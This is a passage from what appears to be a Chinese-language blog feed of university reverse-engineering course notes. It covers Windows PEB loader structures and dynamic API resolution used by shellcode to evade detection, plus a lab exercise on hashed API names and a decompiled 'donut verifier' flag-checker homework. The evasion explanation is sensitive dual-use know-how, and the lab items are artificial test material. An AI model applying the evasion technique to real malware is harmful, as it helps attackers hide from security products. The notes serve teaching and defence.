&lt;li>依載入順序串起的雙向 linked list&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="https://www.vergiliusproject.com/kernels/x64/Windows%2011/22H2%20%282022%20Update%29/_PEB_LDR_DATA">_PEB_LDR_DATA&lt;/a>
&lt;img src="https://hackmd.io/_uploads/BJFj-NAGp.png" alt="" />&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>_LDR_DATA_TABLE_ENTRY
&lt;ul>
&lt;li>紀錄一個載入模組的相關資訊&lt;/li>
&lt;li>==0x00: InLoadOrderModuleList==
&lt;ul>
&lt;li>依載入順序串起的雙向 linked list&lt;/li>
&lt;li>Flink：指向下一個 entry&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>==0x30: DllBase==
&lt;ul>
&lt;li>此載入模組的 ImageBase&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>==0x58: BaseDllName==
&lt;ul>
&lt;li>此載入模組的檔案名稱&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>_LDR_DATA_TABLE_ENTRY
&lt;img src="https://hackmd.io/_uploads/BJ5JfVAMp.png" alt="" />&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Defense Evasion — Dynamic API Resolution
&lt;ul>
&lt;li>用途:
&lt;blockquote>
&lt;p>駭客常用的手法往往倚賴特定的 API 來達成，例如：&lt;code>Injection&lt;/code> = &lt;code>VirtualAllocEx&lt;/code> + &lt;code>WriteProcessMemory&lt;/code> + &lt;code>CreateRemoteThread&lt;/code>，因此資安產品只要監控這些 API，就很容易偵測到惡意行為
Shellcode 沒有 loader 幫你把 API 連結起來&lt;/p></description></item><item><title>Simple Reverse - 0x25(2023 Lab - WinMalware - 作業)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x252023-lab---winmalware---%E4%BD%9C%E6%A5%AD/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x252023-lab---winmalware---%E4%BD%9C%E6%A5%AD/</guid><description>&lt;h1 id="simple-reverse---0x252023-lab---winmalware---作業">
 Simple Reverse - 0x25(2023 Lab - WinMalware - 作業)
 &lt;a class="anchor" href="#simple-reverse---0x252023-lab---winmalware---%e4%bd%9c%e6%a5%ad">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>在 next stage payload 的 my_start 導出函數中，惡意程式透過 dynamic API resolution 手法取得了一些 APIs。請問其從 user32.dll 取得的 API 的名稱為何？
&lt;a href="https://github.com/Mr-Un1k0d3r/WindowsDllsExport/blob/main/Win11-22000/user32.dll.txt">A list of all exported functions of user32.dll&lt;/a>&lt;/p>
&lt;p>Flag format: FLAG{WindowsAPIname}&lt;/p>&lt;/blockquote>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/@SBK6401/Bkd51XRM6">Dynamic API Resolution Background&lt;/a>&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>根據前一個筆記，我們已經知道他怎麼找API，只是我們還不知道他用的到底是哪一個API，因為他有事先用過hash，題目也是要我們找到這一個部分，最簡單的做法是把user32.dll的所有API都用作者自定義的hash function做一遍，直到找到他要的那一個，目前問題最大的應該是不知道&lt;code>__ROL4__&lt;/code>的意思，根據&lt;a href="https://www.felixcloutier.com/x86/rcl:rcr:rol:ror">x86 and amd64 instruction reference&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>The rotate left (ROL) and rotate through carry left (RCL) instructions shift all the bits toward more-significant bit positions, except for the most-significant bit, which is rotated to the least-significant bit location. The rotate right (ROR) and rotate through carry right (RCR) instructions shift all the bits toward less significant bit positions, except for the least-significant bit, which is rotated to the most-significant bit location.&lt;/p></description></item><item><title>Simple Reverse - 0x26(2023 HW - Banana Donut Verifier)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x262023-hw---banana-donut-verifier/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x262023-hw---banana-donut-verifier/</guid><description>&lt;h1 id="simple-reverse---0x262023-hw---banana-donut-verifier">
 Simple Reverse - 0x26(2023 HW - Banana Donut Verifier)
 &lt;a class="anchor" href="#simple-reverse---0x262023-hw---banana-donut-verifier">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>__int64 __fastcall main(int a1, char &lt;span style="color:#f92672">**&lt;/span>a2, char &lt;span style="color:#f92672">**&lt;/span>a3)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">//&lt;/span> [COLLAPSED LOCAL DECLARATIONS&lt;span style="color:#f92672">.&lt;/span> PRESS KEYPAD CTRL&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#e6db74">&amp;#34;+&amp;#34;&lt;/span> TO EXPAND]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v47 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0.0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v46 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0.0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v42 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>LL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> memset(user_input, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">1024&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf(&lt;span style="color:#e6db74">&amp;#34;Dount Verifier&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">Input: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> __isoc99_scanf(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">%1023s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, user_input);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\x1B&lt;/span>&lt;span style="color:#e6db74">[2J&amp;#34;&lt;/span>); &lt;span style="color:#f92672">//&lt;/span> 這個意思是清除整個頁面
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>LL; i &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">499&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> memset(s, &lt;span style="color:#ae81ff">32&lt;/span>, sizeof(s));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> memset(v20, &lt;span style="color:#ae81ff">0&lt;/span>, sizeof(v20));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( j &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0.0&lt;/span>; j &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">6.28&lt;/span>; j &lt;span style="color:#f92672">=&lt;/span> v14 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v40 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( k &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0.0&lt;/span>; k &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">6.28&lt;/span>; k &lt;span style="color:#f92672">=&lt;/span> v13 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v3 &lt;span style="color:#f92672">=&lt;/span> _mm_cvtsi32_si128(LODWORD(k));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v3&lt;span style="color:#f92672">.&lt;/span>m128i_i64 &lt;span style="color:#f92672">=&lt;/span> (compute_sinf)(&lt;span style="color:#f92672">*&lt;/span>v3&lt;span style="color:#f92672">.&lt;/span>m128i_i64);&lt;span style="color:#f92672">//&lt;/span> 計算浮點數的正弦值&lt;span style="color:#960050;background-color:#1e0010">，&lt;/span>參考自https:&lt;span style="color:#f92672">//&lt;/span>learn&lt;span style="color:#f92672">.&lt;/span>microsoft&lt;span style="color:#f92672">.&lt;/span>com&lt;span style="color:#f92672">/&lt;/span>zh&lt;span style="color:#f92672">-&lt;/span>tw&lt;span style="color:#f92672">/&lt;/span>cpp&lt;span style="color:#f92672">/&lt;/span>c&lt;span style="color:#f92672">-&lt;/span>runtime&lt;span style="color:#f92672">-&lt;/span>library&lt;span style="color:#f92672">/&lt;/span>reference&lt;span style="color:#f92672">/&lt;/span>sin&lt;span style="color:#f92672">-&lt;/span>sinf&lt;span style="color:#f92672">-&lt;/span>sinl&lt;span style="color:#960050;background-color:#1e0010">?&lt;/span>view&lt;span style="color:#f92672">=&lt;/span>msvc&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">170&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v37 &lt;span style="color:#f92672">=&lt;/span> COERCE_FLOAT(_mm_cvtsi128_si32(v3));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">=&lt;/span> _mm_cvtsi32_si128(LODWORD(j));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v4&lt;span style="color:#f92672">.&lt;/span>m128i_i64 &lt;span style="color:#f92672">=&lt;/span> (compute_conf)(&lt;span style="color:#f92672">*&lt;/span>v4&lt;span style="color:#f92672">.&lt;/span>m128i_i64);&lt;span style="color:#f92672">//&lt;/span> 計算餘弦值&lt;span style="color:#960050;background-color:#1e0010">，&lt;/span>參考自https:&lt;span style="color:#f92672">//&lt;/span>learn&lt;span style="color:#f92672">.&lt;/span>microsoft&lt;span style="color:#f92672">.&lt;/span>com&lt;span style="color:#f92672">/&lt;/span>zh&lt;span style="color:#f92672">-&lt;/span>tw&lt;span style="color:#f92672">/&lt;/span>cpp&lt;span style="color:#f92672">/&lt;/span>c&lt;span style="color:#f92672">-&lt;/span>runtime&lt;span style="color:#f92672">-&lt;/span>library&lt;span style="color:#f92672">/&lt;/span>reference&lt;span style="color:#f92672">/&lt;/span>cos&lt;span style="color:#f92672">-&lt;/span>cosf&lt;span style="color:#f92672">-&lt;/span>cosl&lt;span style="color:#960050;background-color:#1e0010">?&lt;/span>view&lt;span style="color:#f92672">=&lt;/span>msvc&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">170&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v36 &lt;span style="color:#f92672">=&lt;/span> COERCE_FLOAT(_mm_cvtsi128_si32(v4));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> _mm_cvtsi32_si128(LODWORD(v47));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v5&lt;span style="color:#f92672">.&lt;/span>m128i_i64 &lt;span style="color:#f92672">=&lt;/span> (compute_sinf)(&lt;span style="color:#f92672">*&lt;/span>v5&lt;span style="color:#f92672">.&lt;/span>m128i_i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v35 &lt;span style="color:#f92672">=&lt;/span> COERCE_FLOAT(_mm_cvtsi128_si32(v5));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> _mm_cvtsi32_si128(LODWORD(j));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v6&lt;span style="color:#f92672">.&lt;/span>m128i_i64 &lt;span style="color:#f92672">=&lt;/span> (compute_sinf)(&lt;span style="color:#f92672">*&lt;/span>v6&lt;span style="color:#f92672">.&lt;/span>m128i_i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v34 &lt;span style="color:#f92672">=&lt;/span> COERCE_FLOAT(_mm_cvtsi128_si32(v6));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v7 &lt;span style="color:#f92672">=&lt;/span> _mm_cvtsi32_si128(LODWORD(v47));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v7&lt;span style="color:#f92672">.&lt;/span>m128i_i64 &lt;span style="color:#f92672">=&lt;/span> (compute_conf)(&lt;span style="color:#f92672">*&lt;/span>v7&lt;span style="color:#f92672">.&lt;/span>m128i_i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v33 &lt;span style="color:#f92672">=&lt;/span> COERCE_FLOAT(_mm_cvtsi128_si32(v7));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v32 &lt;span style="color:#f92672">=&lt;/span> v36 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2.0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v31 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1.0&lt;/span> &lt;span style="color:#f92672">/&lt;/span> ((((v37 &lt;span style="color:#f92672">*&lt;/span> (v36 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2.0&lt;/span>)) &lt;span style="color:#f92672">*&lt;/span> v35) &lt;span style="color:#f92672">+&lt;/span> (v34 &lt;span style="color:#f92672">*&lt;/span> v33)) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">5.0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v8 &lt;span style="color:#f92672">=&lt;/span> _mm_cvtsi32_si128(LODWORD(k));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v8&lt;span style="color:#f92672">.&lt;/span>m128i_i64 &lt;span style="color:#f92672">=&lt;/span> (compute_conf)(&lt;span style="color:#f92672">*&lt;/span>v8&lt;span style="color:#f92672">.&lt;/span>m128i_i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v30 &lt;span style="color:#f92672">=&lt;/span> COERCE_FLOAT(_mm_cvtsi128_si32(v8));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v9 &lt;span style="color:#f92672">=&lt;/span> _mm_cvtsi32_si128(LODWORD(v46));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v9&lt;span style="color:#f92672">.&lt;/span>m128i_i64 &lt;span style="color:#f92672">=&lt;/span> (compute_conf)(&lt;span style="color:#f92672">*&lt;/span>v9&lt;span style="color:#f92672">.&lt;/span>m128i_i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v29 &lt;span style="color:#f92672">=&lt;/span> COERCE_FLOAT(_mm_cvtsi128_si32(v9));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v10 &lt;span style="color:#f92672">=&lt;/span> _mm_cvtsi32_si128(LODWORD(v46));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v10&lt;span style="color:#f92672">.&lt;/span>m128i_i64 &lt;span style="color:#f92672">=&lt;/span> (compute_sinf)(&lt;span style="color:#f92672">*&lt;/span>v10&lt;span style="color:#f92672">.&lt;/span>m128i_i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v28 &lt;span style="color:#f92672">=&lt;/span> COERCE_FLOAT(_mm_cvtsi128_si32(v10));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v27 &lt;span style="color:#f92672">=&lt;/span> ((v37 &lt;span style="color:#f92672">*&lt;/span> v32) &lt;span style="color:#f92672">*&lt;/span> v33) &lt;span style="color:#f92672">-&lt;/span> (v34 &lt;span style="color:#f92672">*&lt;/span> v35);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v26 &lt;span style="color:#f92672">=&lt;/span> (((v31 &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">30.0&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> (((v30 &lt;span style="color:#f92672">*&lt;/span> v32) &lt;span style="color:#f92672">*&lt;/span> v29) &lt;span style="color:#f92672">-&lt;/span> (v27 &lt;span style="color:#f92672">*&lt;/span> v28))) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">40.0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v25 &lt;span style="color:#f92672">=&lt;/span> (((v31 &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">15.0&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> ((v27 &lt;span style="color:#f92672">*&lt;/span> v29) &lt;span style="color:#f92672">+&lt;/span> ((v30 &lt;span style="color:#f92672">*&lt;/span> v32) &lt;span style="color:#f92672">*&lt;/span> v28))) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">12.0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v24 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">80&lt;/span> &lt;span style="color:#f92672">*&lt;/span> v25 &lt;span style="color:#f92672">+&lt;/span> v26;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v23 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#ae81ff">8.0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span> ((((((v34 &lt;span style="color:#f92672">*&lt;/span> v35) &lt;span style="color:#f92672">-&lt;/span> ((v37 &lt;span style="color:#f92672">*&lt;/span> v36) &lt;span style="color:#f92672">*&lt;/span> v33)) &lt;span style="color:#f92672">*&lt;/span> v29) &lt;span style="color:#f92672">-&lt;/span> ((v37 &lt;span style="color:#f92672">*&lt;/span> v36) &lt;span style="color:#f92672">*&lt;/span> v35)) &lt;span style="color:#f92672">-&lt;/span> (v34 &lt;span style="color:#f92672">*&lt;/span> v33)) &lt;span style="color:#f92672">-&lt;/span> ((v30 &lt;span style="color:#f92672">*&lt;/span> v36) &lt;span style="color:#f92672">*&lt;/span> v28)));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v25 &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">21&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> v25 &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> v26 &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> v26 &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">79&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> v31 &lt;span style="color:#f92672">&amp;gt;&lt;/span> v20[v24] )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v20[v24] &lt;span style="color:#f92672">=&lt;/span> v31;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v11 &lt;span style="color:#f92672">=&lt;/span> v23;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v23 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v11 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> s[v24] &lt;span style="color:#f92672">=&lt;/span> special_char[v11]; &lt;span style="color:#f92672">//&lt;/span> special_char就是印出甜甜圈的素材
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v40 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">30&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> v42 &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">0x3FF&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v22 &lt;span style="color:#f92672">=&lt;/span> v24 &lt;span style="color:#f92672">^&lt;/span> v23 &lt;span style="color:#f92672">^&lt;/span> (v26 &lt;span style="color:#f92672">+&lt;/span> v25);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v12 &lt;span style="color:#f92672">=&lt;/span> v42&lt;span style="color:#f92672">++&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(user_input &lt;span style="color:#f92672">+&lt;/span> v12) &lt;span style="color:#f92672">^=&lt;/span> v24 &lt;span style="color:#f92672">^&lt;/span> v23 &lt;span style="color:#f92672">^&lt;/span> (v26 &lt;span style="color:#f92672">+&lt;/span> v25);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>v40;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v13 &lt;span style="color:#f92672">=&lt;/span> k &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0.02&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v14 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0.07000000000000001&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\x1B&lt;/span>&lt;span style="color:#e6db74">[H&amp;#34;&lt;/span>); &lt;span style="color:#f92672">//&lt;/span> 這個代表游標回到home position
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( idx &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; idx &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">0x6E0&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>idx ) &lt;span style="color:#f92672">//&lt;/span> 這一段for loop就是在印出甜甜圈
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( idx &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">80&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v15 &lt;span style="color:#f92672">=&lt;/span> s[idx];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v15 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> putchar(v15);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v16 &lt;span style="color:#f92672">=&lt;/span> v47 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0.00004&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v47 &lt;span style="color:#f92672">=&lt;/span> v16;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v17 &lt;span style="color:#f92672">=&lt;/span> v46 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0.00002&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v46 &lt;span style="color:#f92672">=&lt;/span> v17;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> usleep(&lt;span style="color:#ae81ff">30000&lt;/span>u); &lt;span style="color:#f92672">//&lt;/span> 睡眠0&lt;span style="color:#ae81ff">.03&lt;/span>秒
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cipher_1 &lt;span style="color:#f92672">=&lt;/span> verification(user_input, &lt;span style="color:#ae81ff">0x400&lt;/span>uLL);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cipher_2 &lt;span style="color:#f92672">=&lt;/span> verification(key, &lt;span style="color:#ae81ff">0x400&lt;/span>uLL);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( cipher_1 &lt;span style="color:#f92672">==&lt;/span> cipher_2 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Donut likes your input!! :D&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Donut Reject You!! :(&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;No matter donut accept you or not. Here&amp;#39;s a bananacat for you&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(icon);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">112&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">232&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">352&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">480&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">600&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">728&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">856&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">992&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">1128&lt;/span>]);
